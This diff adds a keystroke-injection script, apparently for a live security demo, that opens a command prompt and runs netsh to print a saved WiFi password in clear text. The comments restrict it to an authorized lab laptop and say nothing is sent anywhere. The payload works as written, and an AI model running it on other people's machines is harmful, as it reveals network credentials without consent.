@@ -1,0 +1,24 @@
+REM ============================================================
+REM LAB USE ONLY - authorized demo on your own laptop
+REM ============================================================
+REM What it does: opens cmd.exe and runs netsh to print the
+REM saved WiFi password of the LAB access point on screen.
+REM Nothing is saved, sent, or exfiltrated. The output stays
+REM on the projector for the audience.
+REM
+REM Before demo day: replace LAB_SSID_HERE with your lab SSID.
+REM If you forget, the command just prints an error, which is
+REM the intended safe default.
+REM
+REM Scope: run only on the sacrificial demo laptop, after the
+REM authorization gate in docs/competition-live-runbook.md.
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1200
+STRING netsh wlan show profile name="LAB_SSID_HERE" key=clear
+ENTER
